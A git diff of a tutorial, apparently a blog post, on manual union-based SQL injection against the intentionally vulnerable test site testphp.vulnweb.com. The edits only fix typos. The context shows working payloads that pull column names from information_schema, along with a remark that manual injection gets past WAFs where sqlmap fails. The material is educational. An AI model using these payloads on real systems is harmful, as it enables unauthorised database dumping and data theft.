@@ -125,13 +125,14 @@ cool we have the table names in a single shot
 ```http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,column_name,3 from information_schema.columns where table_schema=database() and table_name='users' limit 0,1```
 
 Here i tried getting the columns in the *users* table 
+
 NB: remember to keep increasing the number of limit after the query
 
 so to get the columns in a shot we can use
 
 ```(SELECT+GROUP_CONCAT(column_name+SEPARATOR+'::')+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='users'+AND+TABLE_SCHEMA=DATABASE())```
 
-NB: set the value of the TABLE_NAME= to the table you are t5rying to get it columns
+NB: set the value of the TABLE_NAME= to the table you are trying to get its columns
 
 ![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/c70af46f-e483-4d4e-a33a-88a78bd5524e)
 
@@ -152,7 +153,7 @@ let's proceed to the next step
 
 NB: i added the column names in a table to be able to dump it contents
 
-so. note down the columns a table then replace them in the payload.
+so, note down the columns a table name then replace them in the payload.
 
 
 `Ps: union based SQLi is helpful because sqlmap cant bypass all Wafs and filters but you can, the success rate in dumping the database is high by doing it manually`
